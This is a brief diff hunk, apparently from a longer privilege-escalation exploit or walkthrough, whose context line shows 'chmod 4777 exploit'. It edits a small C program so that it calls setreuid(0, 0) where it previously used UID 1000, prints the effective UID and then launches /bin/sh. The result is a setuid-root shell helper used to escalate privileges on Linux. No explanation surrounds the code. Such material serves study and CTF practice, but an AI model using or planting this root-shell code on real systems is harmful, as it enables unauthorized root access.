@@ -438,7 +438,7 @@ chmod 4777 exploit
 
 int main( int argc, char *argv[] )
 {
-    setreuid(1000, 1000);
+    setreuid(0, 0);
     printf("ID: %d\n", geteuid());
     execve("/bin/sh", NULL, NULL);
 }
